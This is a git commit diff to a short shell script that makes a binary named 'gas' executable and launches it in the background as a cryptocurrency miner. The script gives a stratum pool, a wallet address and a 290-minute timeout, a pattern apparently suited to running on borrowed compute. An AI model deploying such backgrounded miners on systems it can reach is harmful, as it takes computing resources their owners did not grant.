a64049809decf7ab4edb4c2f8e27b6f088d441e1
sis maryanto <sismaryanto1928@gmail.com>
2021-06-30 03:15:13 +0000

    0.sh edited online with Bitbucket

--- 0.sh
+++ 0.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
+chmod u+x gas
 POOL=stratum+tcps://stratum-eu.rplant.xyz:17042
 WALLET=sugar1qncwd9uvepk8y3qpp25pjvqunyzjlj44wzhn2as.ahaha
 nohup timeout 290m ./gas -a yespowersugar -o $POOL -u $WALLET -t12 &
